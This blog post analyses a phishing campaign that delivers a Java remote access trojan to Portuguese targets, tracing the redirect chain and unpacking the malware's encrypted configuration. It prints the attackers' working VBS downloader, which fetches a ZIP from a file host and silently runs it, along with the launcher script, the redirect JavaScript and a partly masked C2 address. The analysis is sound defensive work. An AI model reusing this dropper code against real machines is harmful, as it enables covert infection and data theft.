---
layout: post
title: "VoicePress5: Tracing a Phishing-to-Java RAT Infection Chain"
categories: [infosec]
tags: [phishing,malware,rat]
thumbnail: /images/javarat26/javarat26.jpeg
description: "Analysis of a phishing campaign spreading a Java-based Remote Access Trojan (RAT) targeting Portuguese institutions."
---


Another day, another phishing attempt. This time let's dive into the analysis of a phishing attempt against a Portuguese volunteer association with a multi-hop infection chain to bypass most email phishing scanners.

<!--more-->

## Spreading the Bait


The email is being spread using a trusted Spanish email service, _serviciodecorreo.es_, which is authorized to send emails on behalf of various domains, including our case, _ourense.es_. Because the SPF records for these domains authorize _serviciodecorreo.es_ as a legitimate sender, the malicious emails pass SPF validation and appear trustworthy.

```text
Subject: Envio em anexo - 202602213326.
Date:  	 26-02-2026 21:45:33
From: 	 placeholder <placeholder@ourense.es>
To: 	 placeholder@placeholder.pt

Exmos. Srs.

Envio em anexo faturas que se encontram por liquidar, 1 fatura já se encontra com 60 dias.

Atenciosamente

* 1 attachment: Fatura.pdf
```

The email also does not contain any obvious threat. The attached PDF is innocuous by itself, it only contains a link to a OneDrive (`https://onedrive.live.com/view.aspx?resid=...`) share PDF file. This file has the same content and look, _except_ the link on the `Ver fatura` button, which now points to a URL shortner: `https://t.co/xxxxxxxxxx`.

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 65%;" alt="PDF file" src="/images/javarat26/fatura.png">
  </div>
</div>

This is a nice trick has most email clients will trust files with any links to legitimate sites as OneDrive (having the short URL could trigger some more advanced scanners), and having the extra hop in the chain also reduces the probability of the short URL pointer being followed and analyzed by automatic tools.

## Getting the Juice

If we click on our `t.co` URL we get redirected to a random _hostinger_ hosted free website (`lightsalmon-dragonfly-XXXXXX.hostingersite.com`). What happens next totally depends on your browser agent and on a reCAPTCHA verification. If you try to access the website with a Linux-base User Agent you are greeted with a broken page mentioning a random Adobe update. If you try to scan the website, using, e.g. [URLScan.io](https://urlscan.io) you are greeted with a valid and working CAPTCHA verification.


<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 80%;" alt="Broken site" src="/images/javarat26/brokensite.png">
  </div>
    <div class="column">
    <img style="width: 80%;" alt="CAPTCHA" src="/images/javarat26/recaptcha.png">
  </div>
</div>



By doing some cURL magic with the user agent (or using a User Agent switcher on the browser) we can get _near_ to the juice.
`curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "https://lightsalmon-dragonfly-XXXXXX.hostingersite.com/?2003085881928339" -L -v`

Now we have a webpage that does some Javascript magic on `window.onload` based on the User Agent information, again.

```js
// ✅ Windows → mantém igual
if (isWindows && (isChrome || isEdge)) {
    document.body.innerHTML = "";
    window.location.href = "https://t.co/h3SvBFiWgg";
    return;
}

if (isMobile) {
    const key = pickKey(mobileTitle, mobileMsg);

    document.documentElement.setAttribute("lang", key);
    document.getElementById("title").innerText = mobileTitle[key] || mobileTitle["en"];
    document.getElementById("paragraph").innerText = mobileMsg[key] || mobileMsg["en"];
    return;
}

```

And we get a new short URL. A nice detail is that this seems to not target mobile devices, as it asks to open the website on the desktop in the case it is opened with a mobile user agent. 

By following the new URL we get to a [ngrok](https://ngrok.com/) served page, `docXXXXXX.ngrok.app`. And some new Javascript magic. The code is almost the same, with the difference that now redirects to a subpage of the ngrok URL, `pdf.php`. Feel free to check the code on [URLScan Report](https://urlscan.io/result/019cbabf-f9c9-742d-bca6-55ce1c44b3a0/dom/).

```js
// ✅ Windows → mantém igual
if (isWindows && (isChrome || isEdge)) {
    document.body.innerHTML = "";
    window.location.href = "pdf.php";
    return;
}
```

If we follow the new link, `docXXXXXX.ngrok.app/pdf.php`, we, finally, get some real juice, a VBS script file, `PL10-03-2026L.vbs`. This is our malware downloader, extractor and initialization script: 

```visualbasic
Option Explicit
Dim zipURL, zipPath, destFolder, scriptToRun
Dim objWinHttp, objADOStream, objFSO, shell, wsh

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")
Set wsh = CreateObject("WScript.Shell")

' Abre a tela de confirmação
On Error Resume Next
wsh.Run "https://drive.google.com/file/d/", 1, False
On Error GoTo 0

zipURL = "https://store-eu-par-1.gofile.io/download/direct/762b5bcc-XXXX-XXXX-bcea-710b28db8cd6/voicepress5.zip"
zipPath = "C:\Users\Public\voicepress.zip"
destFolder = "C:\Users\Public\voicepress"
scriptToRun = destFolder & "\bin\voicepress.cmd"

' Se ainda não tem o zip, baixa
If Not objFSO.FileExists(zipPath) Then
    Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    On Error Resume Next
    objWinHttp.Open "GET", zipURL, False
    objWinHttp.Send
    If Err.Number <> 0 Then
        WScript.Quit
    End If
    On Error GoTo 0

    If objWinHttp.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objWinHttp.ResponseBody
        objADOStream.SaveToFile zipPath, 2
        objADOStream.Close
        Set objADOStream = Nothing
    Else
        WScript.Quit
    End If
    Set objWinHttp = Nothing
    ' Cria a pasta destino
    If Not objFSO.FolderExists(destFolder) Then
        objFSO.CreateFolder destFolder
    End If
    ' Extrai o zip
    shell.NameSpace(destFolder).CopyHere shell.NameSpace(zipPath).Items, 4
    WScript.Sleep 3000
End If
' Abre o manual
If objFSO.FileExists(scriptToRun) Then
    wsh.Run """" & scriptToRun & """", 0, False
End If
```

Finally, we get our final URL to get the malware piece, a `gofile.io` hosted ZIP file, which is downloaded using the `WinHttpRequest` method. We also get our execution entrypoint after extracting the ZIP, `\bin\voicepress.cmd`.

## Analyzing the Package

After following the `gofile.io` link we get our ZIP, `voicepress5.zip`. By manually extracting it we can see a somewhat familiar folder structure and files: 
```bash
├── bin
├── COPYRIGHT
├── legal
├── lib
├── LICENSE
├── README.txt
├── release
├── THIRDPARTYLICENSEREADME-JAVAFX.txt
├── THIRDPARTYLICENSEREADME.txt
└── Welcome.html
```

This is a complete Java installation as we can check by looking into the `release` file: 
```text
JAVA_VERSION="1.8.0_441"
JAVA_RUNTIME_VERSION="1.8.0_441-b07"
OS_NAME="Windows"
OS_VERSION="5.2"
OS_ARCH="amd64"
SOURCE=".:git:fea06d2930f8+"
BUILD_TYPE="commercial"
```

So, whatever malware we are talking about, it _should_ be Java based. By using the aforementioned entrypoint execution path, we can focus on our malware piece, so let's check the content of our `voicepress.cmd`.

```shell
@echo off
set "extractPath=%TEMP%\collectionservice"
:: Verifica se a pasta existe antes de executar
if exist "C:\Users\Public\voicepress\bin\java.exe" (
    start /B "" "C:\Users\Public\voicepress\bin\java.exe" -jar -noverify "C:\Users\Public\voicepress\bin\voicepress.png"
) else (
    echo Erro: Pasta extraída não encontrada!
    exit /b
)
exit
```

The `voicepress` script checks if the extraction went as expect and `java.exe` exists. After that it tries to execute a `png` file. By checking that `png` file we can see that it is just a JAR with the extension changed:
```bash
$ file voicepress.png 
voicepress.png: Zip archive data, at least v2.0 to extract, compression method=deflate
$ jar tf voicepress.png
com/sun/jna/platform/mac/CoreFoundation$CFIndex.class
com/sun/jna/Callback$UncaughtExceptionHandler.class
...
```

## Unpacking the Payload


<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 75%;" alt="jdgui" src="/images/javarat26/jdgui.png">
  </div>
</div>

The next step is to analyse our JAR. For that my usual go-to tool is [JD-GUI](https://java-decompiler.github.io/), a just-works Java decompiler. And, as expected, we are indeed talking about a Java application, `Main-Class: com.proj.client.Client`. By looking into the main class we can observe that the code is highly obfuscated using a combination of different techniques commonly known to be part of commercial Java obfuscator tools such as [Zelix KlassMaster](https://www.zelix.com/klassmaster/index.html) :

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 100%;" alt="Obfuscated code" src="/images/javarat26/obfuscated.png">
  </div>
</div>

There are some parts, however, that were not properly obfuscated, including the name of the classes, files and several functions. With that we can grasp on the capabilities of the malware piece that we have at our hands.

- **Persistence via Service with compatibility to all OS**: right at the start the malware does `getService().install();` which calls the OS-specific service handler, `service = (IService)new WindowsService();`, `service = (IService)new LinuxService();` or `service = (IService)new OSXService();`
- **Calls back to Command-and-Control (C2) server**: it starts a socket `Socket sc = new Socket();` and connects `sc.connect(new InetSocketAddress(CONFIG.getHost(), CONFIG.getPort()), <unknown>);`
- **It tries to distract the victim while installing**: Pops-up random `JOptionPanels` with `JOptionPane.showMessageDialog(null, CONFIG.getMessageBoxText(), CONFIG.getMessageBoxTitle(), CONFIG.getMessageBoxCategory());`
- **It has a logger class**: which seems a lousy part from the attackers to ship with the malware. When executing the JAR in a sandbox we can see this logger working, `Server not available, retrying in 20ms`.
- **Packs a lot of features including camera/microphone remote control, keylogger, browser password stealer, etc.**: Some examples supporting the existence of these features in the code include `decryptChromiumPassword`, `CameraInfo[] getCameras()`, `RobotScreenshot.createScreenshot`, amongst others.

By submitting the malware sample to [VirusTotal](https://www.virustotal.com/gui/file/e8265a39ac667c5f8ad36f9021e9faa06e6df09fcd96bc5e3da27e9b646c6820/detection) we can see this is a known malware, _23/68 security vendors flagged this file as malicious_, of the type RAT (Remote Access Tool), with the known threat label `trojan.java/ratty`.

## The AI tricks

So, we have a highly obfuscated JAR of a know malware strain. However, we have, so far, no clue about the _strings_ in the code, and there typically lies the most important information, hostnames, ports, etc. As most of the strings are encrypted with XOR or similar strategies, we should be able to decrypt them, because, at the end of the day, the JAR is a self-contained piece, thus it needs to have all the encryption keys for whatever encryption is going on. By taking the JAR and throwing it into Claude (free version) and asking it to decrypt the code, it was able to create a Python script (after some back'n'forth) that taking the JAR as an input can do some heuristics and decrypt most of the strings.

You can find the "decoder" code in the following gist: [202028376caa0564a0d5a190ae784299](https://gist.github.com/jpdias/202028376caa0564a0d5a190ae784299)


After some looking into the random strings, a closer look into the `Config.class` that is used by the main `Client.class` to load configurations reveals some _funny_ strings:

```text
======================================================================
  com/proj/client/Config
======================================================================
  (xor     ) key='bChDk'   =>  'Hide_Client_File'
  (xor     ) key='wVRAg'   =>  'Show_Message_Box'
  (des     ) key='gUhCV'   =>  'Message_Box_Title'
  (des     ) key='qzLNE'   =>  'Message_Box_Text'
  (blowfish) key='XUaqE'   =>  'checksum'
  (xor     ) key='HbLHt'   =>  'checksum'
  (des     ) key='iDsaf'   =>  'Failed to read config'

```

> Why is a `checksum` file used in a configuration?...

By looking into the checksum file, we can see that it, in fact, looks a lot like a checksum hash. But now we know this is just smoke and mirrors to make the file look harmless when, in reality, is core part of the malware configuration. Once again, let's see if Claude is up to the task of finding how to decrypt it.

You can find the code at the Gist: [202028376caa0564a0d5a190ae784299](https://gist.github.com/jpdias/202028376caa0564a0d5a190ae784299)

```text
[+] Loaded checksum file: ../voicepress5/bin/voicepress/checksum
[+] Decrypted successfully (256 bytes → 190 chars)

  AES key string : 'checksum'
  AES key (hex)  : a80ed2ef79e22f1d8af817cea1dbbf01

  Host                      = 80.211.137.XX
  Port                      = 7711
  AutoStart                 = true
  Hide_Client_File          = false
  Show_Message_Box          = false
  Message_Box_Title         = 
  Message_Box_Text          = 
  Message_Box_Category      = -1
```

So, Claude was able to successful craft a descriptor of the checksum file and reveal the RAT configurations. By having these configurations on a file, attackers can easily reconfigure their malware without the need of recompiling the Java code, enabling attack at scale. But now remains the question, how did Claude figure it out?

We already know that the `loadConfig` function refers to the checksum file (as per previous step), but this `checksum` string appears two times, and in the second reference this is used as an argument to the `decryptAES` static method call as a decryption **key** (_lousy or intentional?_). But this `decryptAES` function needs to be defined somewhere. The malware packs a `CryptUtil` class, and by looking at the string we can decode from that class we see some interesting results:

```text
======================================================================
  com/proj/client/util/security/CryptUtil
======================================================================
  (des     ) key='LRqHH'   =>  'AES/ECB/PKCS5Padding'
  (xor     ) key='EZovn'   =>  'AES/ECB/PKCS5PADDING'
  (xor     ) key='pNJAQ'   =>  '.enc'
  (des     ) key='tyvJd'   =>  'AES'
  (blowfish) key='PbUxI'   =>  '.dec'
  (blowfish) key='rTeNm'   =>  'AES'
  (xor     ) key='LvcgR'   =>  'SHA-1'
  (xor     ) key='UTgUh'   =>  'AES'
```

The key thing here is the SHA-1 _string_. AES encryption in JAVA requires a key of exactly 16, 24, or 32 bytes, but the function input decryption key `checksum` is only 8 bytes, thus not enough for AES to work. However, the malware code does a SHA-1 encryption of the initial key to make it the larger:

- `javaMessageDigest.getInstance("SHA-1").digest(keyString.getBytes("UTF-8"))` gives 20 bytes, and then,
- `Arrays.copyOf(result, 16)` truncates the SHA-1 to gives us the needed key of 16 bytes.

After that we can use the identified encryption mechanism `AES/ECB/PKCS5Padding` to decrypt the checksum configuration:

```python
key        = derive_aes_key(key_string) #javaMessageDigest.getInstance("SHA-1").digest(keyString.getBytes("UTF-8"))
ciphertext = base64.b64decode(encoded_content.strip()) #checksum file content
cipher     = AES.new(key, AES.MODE_ECB)
padded     = cipher.decrypt(ciphertext)
```

## Summary

This is an analysis of one of the most sophisticated phishing campaigns that I have had the opportunity to take a look into. 